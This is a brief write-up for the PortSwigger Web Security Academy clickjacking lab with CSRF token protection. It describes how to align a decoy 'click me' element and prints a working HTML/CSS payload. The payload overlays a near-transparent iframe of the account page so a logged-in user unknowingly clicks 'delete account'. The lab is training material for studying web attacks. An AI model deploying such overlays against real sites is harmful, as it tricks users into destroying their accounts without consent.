# [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

> goal is to create an overlay for the webapp and trick the user to delete the account

- the burp browser is the best option for the testing of the style
- set the opacity to 0.5 to align the click me with the delete button
- when it is aligned set the opacity to 0.0001

```
<style>
  iframe {
    position: relative;
    width: 800px;
    height: 800px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 510px;
    left: 50px;
    z-index: 1;
  }
</style>
<div>click me</div>
<iframe src="https://xxx.web-security-academy.net/my-account"></iframe>
```

> the logged in user will not see the iframe content just the click me div, by clicking it, the user clicks the delete button in the background
